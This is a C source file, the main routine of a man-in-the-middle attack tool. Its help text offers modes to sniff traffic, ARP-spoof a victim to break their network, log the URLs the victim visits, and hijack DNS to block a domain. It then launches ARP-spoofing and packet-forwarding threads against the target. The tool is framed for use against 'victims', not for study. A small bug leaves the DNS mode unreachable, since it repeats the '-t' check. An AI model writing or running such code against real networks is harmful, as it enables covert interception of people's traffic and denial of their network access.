/*
* MAIN FUNCTION
* AUTHOR: Yue Pan zxc479773533@gmail.com
* LICENSE: MIT License, Copyright (c) 2017 Yue Pan.
* TOTAL: 882lines
*/

#include "head.h"

/* mode control */
int mode;

int main(int argc, char const *argv[]) {

    /* print picture */
    printf("\n");
    printf("|    | |    | ˉˉˉˉˉ|         | ˉˉ|ˉˉ\n");
    printf("|----| |    | _____|    |    |   |  \n");
    printf("|    | |____| |____|    |____| __|__\n");
    printf("\n\n");

    /* choose mode */
    if (argv[1] != NULL && !strcmp(argv[1], "-h")) {
        printf("\nUsage: ./Attacker + [argv1] + ([argv2])\n\n");
        printf("\t-h: See help.\n\n");
        printf("\t-s \"[argv2]\": Open sniffer, and argv2 is a pcap filter expression.\n\n");
        printf("\t[pcap filter] format:\n\n");
        printf("\t\tether src [mac]: source MAC is [mac].\n\n");
        printf("\t\tether dst [mac]: destination MAC is [mac].\n\n");
        printf("\t\tdst [ip]: destination ip is [ip].\n\n");
        printf("\t\tsrc [ip]: source ip is [ip].\n\n");
        printf("\t\thost [ip]: source ip is [ip] or destination ip is [ip].\n\n");
        printf("\t\tdst port [port]: destination port is [port].\n\n");
        printf("\t\tsrc port [port]: source port is [port].\n\n");
        printf("\t\tether [type]: ip, ip6, arp, rarp, atalk, aarp, decnet, iso, stp, ipx, etc.\n\n");
        printf("\t\t[proto type]: tcp, udp, icmp, etc.\n\n");
        printf("\t\tLogical operators: and, or, not\n\n");
        printf("\t-b [time]: Break someone's network for [time(seconds)] long.\n\n");
        printf("\t-b: Break someone's network.\n\n");
        printf("\t-t: Get all webpage information your vitcim visited.\n\n");
        printf("\t-d: Lanuch a DNS hijack, and forbid you victim visit *.baidu.com\n\n");
        printf("Attention: -t will not function when he visit webpage using HTTPS encryption.\n");
        exit(1);
    }
    else if (argv[1] != NULL && !strcmp(argv[1], "-s")) {
        mode = Sniff;
        printf("MODE: SNIFF!\n\n");
    }
    else if (argv[1] != NULL && !strcmp(argv[1], "-b")) {
        mode = Break;
        printf("MODE: BREAK!\n\n");
    }
    else if (argv[1] != NULL && !strcmp(argv[1], "-t")) {
        mode = Get;
        printf("MODE: GET!\n\n");
    }
    else if (argv[1] != NULL && !strcmp(argv[1], "-t")) {
        mode = Dns;
        printf("MODE: DNS HIJACK!\n\n");
    }
    else {
        printf("A small tool to launch a Man-in-the-middle attack, and HUA JI your victims.\n");
        printf("MIT License, Copyright (c) 2017 Yue Pan.\n");
        printf("Please launch this tool as root.\n");
        printf("for help, use -h.\n");
        exit(1);
    }

    if (mode == Sniff) {
        Sniffer(argv[2]);
        exit(1);
    }
    /* device */
    char *device = "wlp1s0";
    
    /* build info */
    MITM_info MITM_arg;
    Getinfo(&MITM_arg);
    MITM_arg.dev = device;
    MITM_arg.mode = mode;
    char filter_app[50] = "ip and ether dst ";
    char mymac[50];
    sprintf(mymac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", MITM_arg.ATTACKER_MAC[0], MITM_arg.ATTACKER_MAC[1],
    MITM_arg.ATTACKER_MAC[2], MITM_arg.ATTACKER_MAC[3], MITM_arg.ATTACKER_MAC[4], MITM_arg.ATTACKER_MAC[5]);
    strcat(filter_app, mymac);
    MITM_arg.filter = filter_app;
    
    /* multiplythreading */
    pthread_t thread1, thread2, thread3, thread4, thread5, thread6, thread7, thread8;
    int ret_thread1, ret_thread2, ret_thread3, ret_thread4, ret_thread5, ret_thread6, ret_thread7, ret_thread8;

    /* arpspoof */
    printf("ATTACK!\n");
    ret_thread1 = pthread_create(&thread1, NULL, (void *)&Arpspoof, (void *)&MITM_arg);
    
    if (mode == Break) {
        printf("Now his net work is break down!\n");
        if (argv[2] != NULL) {
            int time = atoi(argv[2]);
            printf("His network will be \"repaired\" after %d seconds\n", time);
            sleep(time);
        }
        else
            pthread_join(thread1, NULL);
    }

    /* forward */
    if (mode == Get) {
        printf("Now his network is in your power!\n");
        printf("Next are urls he visited!\n\n");
    }
    if (mode == Dns) {
        printf("Now your victim can't visit *.baidu.com\n\n");
    }
    ret_thread2 = pthread_create(&thread2, NULL, (void *)&forward_packet, (void *)&MITM_arg);
    ret_thread3 = pthread_create(&thread3, NULL, (void *)&forward_packet, (void *)&MITM_arg);

    /* before end */
    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);
    pthread_join(thread3, NULL);
    return 0;
}